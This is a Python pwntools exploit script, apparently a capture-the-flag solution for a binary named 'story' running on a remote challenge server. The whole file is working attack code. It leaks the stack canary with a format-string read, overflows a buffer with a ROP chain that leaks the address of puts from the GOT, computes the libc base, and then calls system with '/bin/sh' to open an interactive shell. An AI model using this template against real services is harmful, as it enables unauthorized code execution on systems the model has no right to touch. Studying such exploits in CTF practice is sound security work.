#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 0
debug =0
context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./story")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("ctf1.linkedbyx.com","10075")
    libc=ELF("./10.so")
if debug:
    gdb.attach(a,'''
              
              ''')
elf=ELF("./story") 
offset=8

#leak canary
def leak_canary():
    a.recvuntil("ID:")
    a.sendline("%15$p")
    a.recvuntil("Hello ")
    canary=eval(a.recvuntil("\n",drop=True))
    return canary

pop_rdi_ret=0x0000000000400bd3
puts_got=elf.got["puts"]
puts_plt=elf.plt["puts"]
start_addr=0x400780

canary=leak_canary()
a.recvuntil("\n")
a.sendline("1024")
a.recvuntil("\n")
payload='A'*136
payload+=p64(canary)
payload+='A'*8 #fake rbp
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start_addr)

a.sendline(payload)
puts_addr=u64(a.recvuntil("\n",drop=True).ljust(8,'\x00'))
success("puts_addr ==>0x%x"%puts_addr)


libc_base=puts_addr-libc.symbols["puts"]
sh_addr=libc_base+next(libc.search("/bin/sh\x00"))
system_addr=libc_base+libc.symbols["system"]

canary=leak_canary()
a.recvuntil("\n")
a.sendline("1024")
a.recvuntil("\n")
payload='A'*136
payload+=p64(canary)
payload+='A'*8 #fake rbp
payload+=p64(pop_rdi_ret)
payload+=p64(sh_addr)
payload+=p64(system_addr)
a.sendline(payload)
a.interactive()